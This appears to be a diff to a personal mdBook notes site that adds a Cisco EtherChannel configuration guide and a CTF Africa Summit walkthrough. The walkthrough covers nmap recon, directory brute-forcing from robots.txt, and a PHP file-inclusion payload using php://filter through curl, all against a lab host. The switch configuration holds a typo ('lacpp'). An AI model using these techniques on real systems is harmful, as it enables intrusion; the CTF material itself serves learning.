@@ -36,10 +36,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-03067677.js";
+            window.path_to_searchindex_js = "searchindex-4e2f1789.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-82b7c2a0.js"></script>
+        <script src="toc-c56f5554.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -717,6 +717,39 @@ do write
 </code></pre>
 <p>And if u ping this time round, they should be able to communicate through the router.</p>
 <div style="break-before: page; page-break-before: always;"></div>
+<h1 id="etherchannel-configuration"><a href="#etherchannel-configuration" class="header">Etherchannel configuration</a></h1>
+<h2 id="configuring-etherchannel"><a class="header" href="#configuring-etherchannel">Configuring etherchannel</a></h2>
+<p>Ether channel is the process of combining two physical ports and making them work as one. Below is my topology.
+<img src="images/etherchannel/topology.png" alt="topology"></p>
+<p>We have 3 different switches and two different PCs. The PCs should communicate with no loss.
+Below are the commands to be run in each of the switches.</p>
+<pre><code class="language-text">int range f0/1-2
+channel-protocol lacp
+channel-group 1 mode active
+
+int port-channel 1
+switchport mode trunk 
+spanning-tree portfast
+
+int range f0/3-4
+channel-protocol lacpp
+channel-group 2 mode active
+
+int port-channel 2
+switchport mode trunk 
+spanning-tree portfast
+</code></pre>
+<p>Please be mindful about the ports. U might want to repeat the command for each ports in the range if the ports are not continuous. We only use the <strong>range</strong> command only when the ports are continuous.</p>
+<h1 id="commands-explained"><a class="header" href="#commands-explained">Commands explained.</a></h1>
+<ul>
+<li><strong>int range <port range=""></port></strong>: This is used to combine a range of continous ports and configure them at once.</li>
+<li><strong>channel-protocol lacp</strong> This is used to chose the protocol to be used for the configuration. CISCO has two different protocols for etherchannel connection ie lacp (Link Aggregation Control Protocol which is the standard protocol) and PAgP (Port Aggregataion Protocaol. This is Cisco proprietry protocol)</li>
+<li><strong>channel-group <number> mode active</number></strong>: It adds the interface to an EtherChannel and enables LACP in active mode to actively negotiate the bundle</li>
+<li><strong>int port-channel <bundle number=""></bundle></strong>: This enters the port for other configurations.</li>
+</ul>
+<p><em>the rest of the commands are discussed in enterprise networking</em></p>
+<h1 id="why-use-the-etherchannel-configuration-for-the-network"><a class="header" href="#why-use-the-etherchannel-configuration-for-the-network">Why use the etherchannel configuration for the network.</a></h1>
+<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="authentication-and-authorisation-1"><a href="#authentication-and-authorisation-1" class="header">Authentication and Authorisation</a></h1>
 <h2 id="authentication-and-authorisation"><a class="header" href="#authentication-and-authorisation">Authentication and Authorisation</a></h2>
 <p>These are the two most important aspects in security. well not most but one of the most as per say.. i dont know what you would say about this but this is according to my realisation.</p>
@@ -740,6 +773,97 @@ is sometimes called “broken authentication”.</li>
 <li>https://portswigger.net/web-security/authentication/other-mechanisms</li>
 </ul>
 <p>Rate limiting by blokcking the ip address of the suspect. This can happen temporarily and permanently.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="cas-walkthrough"><a href="#cas-walkthrough" class="header">CAS walkthrough</a></h1>
+<h2 id="ctf-africa-summit-cas-walkthrough"><a class="header" href="#ctf-africa-summit-cas-walkthrough">CTF Africa Summit (CAS) walkthrough</a></h2>
+<h1 id="recon"><a class="header" href="#recon">Recon</a></h1>
+<p>Always the fst phase. I ran an nmap scan and below is what i got.</p>
+<pre><code class="language-text">nmap -sC -sV 10.241.20.42                                                                              
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-27 00:09 +0300
+Nmap scan report for 10.241.20.42
+Host is up (0.16s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+3306/tcp open  mysql   MySQL 5.7.33-0ubuntu0.16.04.1
+|_ssl-date: TLS randomness does not represent time
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.33-0ubuntu0.16.04.1
+|   Thread ID: 8
+|   Capabilities flags: 65535
+|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, SupportsCompression, SupportsLoadDataLocal, LongPassword, SupportsTransactions, ConnectWithDatabase, IgnoreSigpipes, Speaks41ProtocolOld, InteractiveClient, SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, FoundRows, IgnoreSpaceBeforeParenthesis, ODBCClient, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: is\x17J\x13\x1E7v\x12MtU\x11\x16\x14hP&amp;J\x1E
+|_  Auth Plugin Name: mysql_native_password
+| ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
+| Not valid before: 2026-03-27T07:52:18
+|_Not valid after:  2036-03-24T07:52:18
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 44.14 seconds
+</code></pre>
+<p>The machine is having two open ports. One is for web and anotherone is the database. Lets get to the web and see what we can get for ourselves.</p>
+<p>Below is what i found at the page.</p>
+<p><img src="images/CAS/opening%20the%20server.png" alt="opening image"></p>
+<p>Well theres literally nothing much. At looking at this, i decided to check on the machine’s robots.txt for some important files. Remember it is what the developers use to disallow crawlers from accessing important files. Below are some of the content of the robots.txt its where i found the fst flag.
+<img src="images/CAS/robots.png" alt="robots">
+well the flag is base64 encoded.Lets decode and submit.</p>
+<pre><code class="language-bash">echo "TmV0aGVybGFuZHMgRmxhZzogYjI1ZjczNTAyYjg2MmVjZTJjYTRjMzliZmU0YTU3M2Q=" | base64 -d
+</code></pre>
+<p>this command will give you the file.</p>
+<p>So after, the content of the robots.txt seemed interesting. So i gothered all of them and decided to make a wordlist for a directory bruteforce. I copied all the content, pasted in a file, and then ran this command to remove the allow.</p>
+<pre><code class="language-bash">grep "^Allow:" robots.txt | cut -d' ' -f2 &gt; directories.txt
+</code></pre>
+<p>So after, i made a directory bruteforce and found only one folder that was redirected.</p>
+<p><img src="images/CAS/ffuf.png" alt="bruteforce"></p>
+<p>I navigated to the page and it landed us on this page with my best DC characters</p>
+<p><img src="images/CAS/CAS.png" alt="suicide squad"></p>
+<p>I found the flag in the source code when i pressed ctrl + u on firefox.</p>
+<p><img src="images/CAS/src.png" alt="sorce"></p>
+<p>The flag was commented as an encoded comment. So i had to decode it.</p>
+<p><em>3 flags to go.. hmmm!</em></p>
+<p>After trying and fuzzing all possible ways, even tried bruteforcing a captcha, i realise that the website had a file inclusion vulnerability. and this was a break through. I decided to check the configuration file. When u append the <strong>.php</strong> u might get nothig, but when u visit the <strong>config</strong> as shown below, this will give u something interesting.</p>
+<p><img src="images/CAS/file%20inclusion.png" alt="file inclusion"></p>
+<p>whenu decode the encoded text, u will get he flag
+<strong>Decode the encoded text twice</strong>
+<img src="images/CAS/decode.png" alt="decode"></p>
+<p>That gave us the 3rd flag. So we had two remaining.
+Kept looking for different files in the server and till i got to some directory that looked like an encoded or hashed string. When u navigate to the member end point, below is what i got.</p>
+<pre><code class="language-bash">curl "http://10.241.20.42/CTF_AFRICA_SUMMIT_2026/?page=php://filter/convert.base64-encode/resource=member"
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;CTF Intranet Image Hosting&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;
+&lt;img src="images/CTF_CERT-01.png"&gt;&lt;br /&gt;
+&lt;hr&gt;
+[ &lt;a href="/CTF_AFRICA_SUMMIT_2026"&gt;Home&lt;/a&gt; ] [ &lt;a href="?page=flag"&gt;Flag&lt;/a&gt; ] [ &lt;a href="?page=login"&gt;Login&lt;/a&gt; ] [ &lt;a href="?page=member"&gt;Member Area&lt;/a&gt; ]
+&lt;hr/&gt;&lt;br/&gt;
+PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoIWlzc2V0KCRfU0VTU0lPTlsndXNlciddKSkgeyBkaWUoJ1lvdSBtdXN0IGJlIGxvZyBpbi4nKTsgfQo/Pgo8aHRtbD4KCTxib2R5PgoJCTxhIGhyZWY9Ii9DVEZfQUZSSUNBX1NVTU1JVF8yMDI2LzMyMmZjMzQ5MzZjNzBkNGM4MWJhMDExYzZiYWM3ZGYzL19fU3Vja2VyIGZvciBQYWluX18iPlN1Y2tlciBmb3IgUGFpbjwvYT4KCTwvYm9keT4KPC9odG1sPgo=&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>when i decoded the string, i found some endpoint that was leading to an achieved file as shown in the screen shot.
+<img src="images/CAS/sucker.png" alt="sucker"></p>
+<p>I downloaded this file and in the file is where the other flag was located.</p>
+<p>The last flag was located in an image. She is the most pathetic character in the whole of DC i believe. Comic guys can relate. <strong>Hailey</strong>.
+<img src="images/CAS/Harley.jpg" alt="Hailey">
+So in its meta data was the hint for the flag. When u use exiftool, there is a random string that u see.</p>
+<p><img src="images/CAS/random.png" alt="meta"></p>
+<p>This data is so very much random than what we might want to expect.
+The string is obfuscated using ROT13. and it was pointing to the flag. when decoded, it would make;</p>
+<pre><code class="language-text">Kenya Flag = md5("$country" . "$city" . "Summit")d
+</code></pre>
+<p>So we had to get these details and then create an md5 hash. That would be our flag.
+country -&gt; Kenya
+City -&gt; Nirobi
+Summit -&gt; summit
+so if hash these using md5, we get the flag.</p>
+<p>Thanl you for reading. For more solutions, refer to my <a href="https://medium.com/@mudiuth">medium</a> accout.
+<strong>L0C4L_M3N</strong></p>
 
                     </main>
 
